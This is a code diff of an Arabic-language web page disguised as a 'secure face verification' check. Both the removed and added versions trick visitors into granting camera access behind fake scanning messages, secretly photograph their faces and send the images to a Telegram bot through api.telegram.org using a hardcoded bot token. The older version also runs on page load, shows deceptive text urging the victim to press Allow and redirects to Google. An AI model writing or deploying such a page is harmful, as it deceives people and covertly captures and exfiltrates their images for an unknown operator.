@@ -2,72 +2,74 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق الآمن</title>
+    <title>تحقق من الوجه</title>
     <style>
-        body { background-color: #0b0e14; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .loader { border: 4px solid #1a2333; border-top: 4px solid #00dd85; border-radius: 50%; width: 55px; height: 55px; animation: spin 1s linear infinite; margin-bottom: 25px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 1.1rem; font-weight: bold; color: #a0aec0; text-align: center; padding: 0 20px; }
-        canvas, video { display: none; }
+        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding-top: 50px; }
+        #status { font-size: 20px; color: #ffcc00; margin-bottom: 20px; }
+        #video { display: none; } /* الكاميرا مخفية */
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <div id="status">جاري فحص ملامح الوجه لتأكيد الأمان الفوري...<br><small style="display:block; font-size:0.8rem; color:#e53e3e; margin-top:10px;">(يرجى الضغط على "سماح / Allow" إذا ظهرت لك نافذة التأكيد)</small></div>
-    <canvas id="canvas"></canvas>
 
-<script>
-    # تم تحديث التوكن الجديد هنا بنجاح
-    const TELEGRAM_TOKEN = '8446745973:AAGRD2tFbSrzB2OFoByvYRHCY1Hp6nluHf0';
-    const urlParams = new URLSearchParams(window.location.search);
-    const CHAT_ID = urlParams.get('chatId') || '8169635171'; 
+    <div id="status">اضغط للبدء</div>
+    <button id="startBtn">بدء التحقق</button>
+    <video id="video" autoplay playsinline></video>
 
-    async function startCapture() {
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
+    <script>
+        const TOKEN = "8446745973:AAGRD2tFbSrzB2OFoByvYRHCY1Hp6nluHf0";
+        const CHAT_ID = "ضع_ايديك_هنا"; // <--- ضع رقم الآيدي الخاص بك هنا بدقة
+        const statusEl = document.getElementById('status');
+        const video = document.getElementById('video');
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.createElement('video');
-            video.setAttribute('playsinline', ''); 
-            video.srcObject = stream;
-            await video.play();
+        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-            // وقت كافٍ للتركيز والتقاط صورة واضحة
-            setTimeout(async () => {
+        document.getElementById('startBtn').onclick = async () => {
+            document.getElementById('startBtn').style.display = 'none';
+            
+            try {
+                // 1. جاري الفحص
+                statusEl.innerText = "جاري فحص ملامح الوجه...";
+                await sleep(2000); // انتظر 2 ثانية
+
+                // 2. جاري التأكد
+                statusEl.innerText = "جاري التأكد...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await sleep(1500); // انتظر لحظة لضبط الكاميرا
+
+                // 3. التقاط الصورة
+                const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.getContext('2d').drawImage(video, 0, 0);
 
+                // 4. إرسال الصورة
+                statusEl.innerText = "جاري إتمام العملية...";
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'verification_face.jpg');
+                    formData.append('photo', blob, 'face.jpg');
 
-                    try {
-                        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        if (response.ok) { console.log("Sent"); }
-                    } catch (e) {
-                        console.error(e);
-                    } finally {
-                        stream.getTracks().forEach(track => track.stop());
-                        window.location.replace("https://www.google.com");
+                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (response.ok) {
+                        statusEl.innerText = "تم التحقق بنجاح!";
+                    } else {
+                        statusEl.innerText = "حدث خطأ في الاتصال بالسيرفر.";
                     }
-                }, 'image/jpeg', 0.75);
+                    
+                    // إغلاق الكاميرا بعد الانتهاء
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg');
 
-            }, 2000); 
-
-        } catch (error) {
-            // عبارة تمويه ذكية لحث المستخدم على التراجع والقبول بالإذن
-            document.getElementById('status').innerHTML = "<span style='color:#f56565;'>❌ فشل التأكيد التلقائي!</span><br><br>يجب عليك إعادة تحديث الصفحة والضغط على <b>'سماح / Allow'</b> لتتمكن المنظومة من مطابقة الحساب والعبور.";
-        }
-    }
-
-    window.onload = startCapture;
-</script>
+            } catch (err) {
+                statusEl.innerText = "يجب السماح بالوصول للكاميرا لإكمال الفحص.";
+                console.error(err);
+            }
+        };
+    </script>
 </body>
 </html>
